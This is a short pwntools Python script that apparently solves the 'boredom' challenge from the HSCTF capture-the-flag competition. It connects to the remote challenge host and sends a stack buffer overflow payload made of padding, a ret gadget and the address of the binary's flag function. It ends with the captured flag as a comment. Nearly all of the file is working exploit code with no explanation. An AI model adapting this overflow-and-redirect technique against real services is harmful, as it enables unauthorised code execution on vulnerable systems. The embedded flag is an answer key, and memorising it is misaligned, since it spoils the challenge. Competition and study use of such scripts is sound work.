from pwn import *


binpath = './boredom'
elf = ELF(binpath)


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
context.log_level = "DEBUG"


# io = process(binpath)
gdbscript = '''
gef
b main
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('pwn.hsctf.com', 5002)

io.recvuntil(b'do: ')

payload = b''
payload += b'A' * 0xd8
payload += p64(0x000000000040101a)
payload += p64(elf.symbols["flag"])
print(payload)
io.sendline(payload)

io.read()


io.interactive()


# flag{7h3_k3y_l0n3l1n355_57r1k35_0cff9132}
